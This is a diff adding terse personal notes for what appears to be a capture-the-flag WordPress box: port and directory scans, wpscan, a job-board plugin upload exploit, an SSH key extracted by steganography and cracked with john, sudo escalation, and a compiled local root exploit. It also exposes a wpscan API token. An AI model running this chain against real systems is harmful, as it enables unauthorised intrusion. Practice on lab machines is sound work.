@@ -1,0 +1,33 @@
+wordpress機器
+
+nmap -sVC  10.129.1.188   -Pn
+gobuster dir  -u http://10.129.1.188 /  -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+find user takis in page
+wpscan --url http://10.129.1.188 --enumerate vp --api-token yebWdQNmyXU7oApKQatIaLPe5NL0EkYTjuSunpp5DIU
+find job manager plugin exploit
+use burpsutie to brute http://10.129.1.188/index.php/jobs/apply/13/
+gthe 13 can upload file
+the plugin but is can find file in the structube
+/wp-content/uploads/year/month/filename
+use exploit.py to find the   HackerAccessGranted.jpg
+file HackerAccessGranted.jpg
+steghide info HackerAccessGranted.jpg
+steghide  --extract -sf HackerAccessGranted.jpg
+get the id_rsa
+/usr/share/john/ssh2john.py id_rsa > crypt_key
+
+john hash.txt --format=raw-md5 --wordlist=/home/qoo7972365/Desktop/rockyou.txt
+
+john crypt_key --wordlist=/home/qoo7972365/Desktop/rockyou.txt
+find passowrd is superpassword
+chmod 0400
+ssh -i id_rsa takis@10.129.1.188
+sudo -l
+sudo /bin/fuckin /bin/bash
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+chmod +x
+
+generate exploit.c and execute
+gcc 45010.c -o exploit.c
+chmod +x exploit.c
+./exploit.c
